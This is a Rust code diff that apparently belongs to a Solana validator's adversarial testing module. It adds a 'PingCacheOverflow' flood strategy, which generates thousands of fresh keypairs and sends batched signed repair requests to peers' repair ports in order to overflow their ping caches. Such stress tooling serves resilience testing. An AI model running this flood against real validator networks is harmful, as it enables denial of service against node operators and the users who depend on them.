@@ -3,19 +3,23 @@ use {
         FloodConfig, FloodStrategy, PeerIdentifier,
     },
     log::*,
+    rayon::{prelude::*, ThreadPool},
     solana_gossip::{
         cluster_info::ClusterInfo,
         contact_info::{ContactInfo, Protocol},
     },
+    solana_keypair::Keypair,
     solana_net_protocol::repair::{RepairProtocol, RepairRequestHeader},
     solana_pubkey::{ParsePubkeyError, Pubkey},
+    solana_rayon_threadlimit::get_thread_count,
+    solana_runtime::bank_forks::BankForks,
     solana_streamer::sendmmsg::{batch_send, SendPktsError},
     solana_time_utils::timestamp,
     std::{
         net::{IpAddr, UdpSocket},
         sync::{
             atomic::{AtomicBool, Ordering},
-            Arc,
+            Arc, RwLock,
         },
         thread::{self, sleep, Builder, JoinHandle},
         time::{Duration, Instant},
@@ -50,23 +54,45 @@ pub struct RepairPacketFlood {
 impl RepairPacketFlood {
     pub fn new(
         repair_socket: Arc<UdpSocket>,
+        bank_forks: Arc<RwLock<BankForks>>,
         cluster_info: Arc<ClusterInfo>,
         configs: Vec<FloodConfig>,
     ) -> Self {
+        const MAX_PACKET_FLOOD_THREADS: usize = 8;
         let exit = Arc::new(AtomicBool::default());
+        let thread_pool = Arc::new(
+            rayon::ThreadPoolBuilder::new()
+                .num_threads(get_thread_count().min(MAX_PACKET_FLOOD_THREADS))
+                .thread_name(|i| format!("solAdvRPFWrkr{i:02}"))
+                .build()
+                .unwrap(),
+        );
+        let keypair_pool = Arc::new(RwLock::new(Vec::default()));
         let mut i: usize = 0;
         let thread_hdls = configs
             .into_iter()
             .map(|config| {
                 let exit = exit.clone();
+                let thread_pool = thread_pool.clone();
                 let repair_socket = repair_socket.clone();
+                let bank_forks = bank_forks.clone();
                 let cluster_info = cluster_info.clone();
                 let thread_name = format!("solAdvRpFld{i:02}");
+                let keypair_pool = keypair_pool.clone();
                 i = i.saturating_add(1);
                 Builder::new()
                     .name(thread_name.clone())
                     .spawn(move || {
-                        Self::run(&repair_socket, &cluster_info, &exit, config, thread_name);
+                        Self::run(
+                            &repair_socket,
+                            &bank_forks,
+                            &cluster_info,
+                            &exit,
+                            &thread_pool,
+                            config,
+                            thread_name,
+                            &keypair_pool,
+                        );
                     })
                     .unwrap()
             })
@@ -150,12 +176,88 @@ impl RepairPacketFlood {
         packet_count
     }
 
+    fn flood_ping_cache(
+        repair_socket: &UdpSocket,
+        bank_forks: &RwLock<BankForks>,
+        cluster_info: &ClusterInfo,
+        config: &FloodConfig,
+        peers: &[ContactInfo],
+        thread_pool: &ThreadPool,
+        keypair_pool: &RwLock<Vec<Keypair>>,
+    ) -> usize {
+        const MIN_PARALLEL_ITEMS: usize = 1_000;
+        const MAX_SENDMMSG_ITEMS: usize = 10_000;
+        {
+            // Populate keypair pool if necessary
+            // See REPAIR_PING_CACHE_CAPACITY to size keypair_pool
+            let mut keypair_pool = keypair_pool.write().unwrap();
+            if keypair_pool.len() < usize::try_from(config.packets_per_peer_per_iteration).unwrap()
+            {
+                *keypair_pool = thread_pool
+                    .install(|| {
+                        (0..config.packets_per_peer_per_iteration)
+                            .into_par_iter()
+                            .with_min_len(MIN_PARALLEL_ITEMS)
+                            .map(|_i| Keypair::new())
+                    })
+                    .collect();
+            }
+        }
+        let slot = bank_forks.read().unwrap().working_bank().slot();
+        let mut packet_count: usize = 0;
+        let keypairs = keypair_pool.read().unwrap();
+        peers.iter().for_each(|peer| {
+            for chunk in keypairs.chunks(MAX_SENDMMSG_ITEMS) {
+                let reqs_v: Vec<_> = thread_pool
+                    .install(|| {
+                        chunk
+                            .par_iter()
+                            .with_min_len(MIN_PARALLEL_ITEMS)
+                            .map(|keypair| {
+                                let header = RepairRequestHeader::new(
+                                    cluster_info.id(),
+                                    *peer.pubkey(),
+                                    timestamp(),
+                                    789, /*nonce*/
+                                );
+                                let request_proto = RepairProtocol::HighestWindowIndex {
+                                    header,
+                                    slot,
+                                    shred_index: 0,
+                                };
+                                let packet_buf =
+                                    RepairProtocol::repair_proto_to_bytes(&request_proto, keypair)
+                                        .unwrap();
+                                (packet_buf, peer.serve_repair(Protocol::UDP).unwrap())
+                            })
+                    })
+                    .collect();
+                packet_count = packet_count.saturating_add(reqs_v.len());
+                let reqs_iter = reqs_v.iter().map(|(data, addr)| (data, addr));
+                if let Err(SendPktsError::IoError(err, num_failed)) =
+                    batch_send(repair_socket, reqs_iter)
+                {
+                    error!(
+                        "batch_send failed to send {}/{} packets first error {:?}",
+                        num_failed,
+                        reqs_v.len(),
+                        err
+                    );
+                }
+            }
+        });
+        packet_count
+    }
+
     fn run(
         repair_socket: &UdpSocket,
+        bank_forks: &RwLock<BankForks>,
         cluster_info: &ClusterInfo,
         exit: &AtomicBool,
+        thread_pool: &ThreadPool,
         config: FloodConfig,
         thread_name: String,
+        keypair_pool: &RwLock<Vec<Keypair>>,
     ) {
         const REPORT_INTERVAL_MS: u64 = 2_000;
         let mut last_report = Instant::now();
@@ -204,6 +306,15 @@ impl RepairPacketFlood {
                 FloodStrategy::SignedPackets => {
                     Self::flood_signed_packets(repair_socket, cluster_info, &config, &peers)
                 }
+                FloodStrategy::PingCacheOverflow => Self::flood_ping_cache(
+                    repair_socket,
+                    bank_forks,
+                    cluster_info,
+                    &config,
+                    &peers,
+                    thread_pool,
+                    keypair_pool,
+                ),
             });
             if last_report.elapsed() >= Duration::from_millis(REPORT_INTERVAL_MS) {
                 let num_peers = peers.len();
